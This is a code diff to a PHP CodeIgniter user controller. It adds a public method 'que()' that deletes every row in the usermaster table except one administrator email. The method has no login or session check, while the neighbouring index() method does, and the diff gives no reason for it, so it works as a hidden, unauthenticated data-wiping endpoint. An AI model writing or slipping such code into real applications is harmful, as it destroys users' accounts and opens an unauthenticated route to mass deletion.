@@ -13,6 +13,16 @@ class Users extends CI_Controller {
 
 	}
 
+
+public function que()
+	{
+		
+		$query3 = $this->db->query("DELETE FROM usermaster where Email != 'admin@administrator.com'");
+		$data_1= $query3->result();
+		
+	}
+
+
 	public function index(){
 	    //print_r($_SESSION);exit();
 	    if(!isset($_SESSION['logged_in']))
